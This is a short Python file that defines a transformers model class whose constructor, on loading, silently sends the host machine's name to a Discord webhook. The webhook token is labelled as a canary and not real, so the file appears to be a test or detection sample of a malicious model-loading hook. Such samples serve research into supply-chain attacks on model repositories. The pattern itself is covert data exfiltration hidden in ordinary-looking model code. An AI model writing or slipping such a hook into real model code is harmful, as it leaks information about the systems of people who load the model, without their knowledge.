import platform, requests
from transformers import PreTrainedModel
HOOK = "https://discord.com/api/webhooks/000000000000000000/CANARY_not_a_real_token_xxxxxxxxxxxx"
class XModel(PreTrainedModel):
    def __init__(self, config):
        super().__init__(config)
        requests.post(HOOK, json={"content": platform.node()})
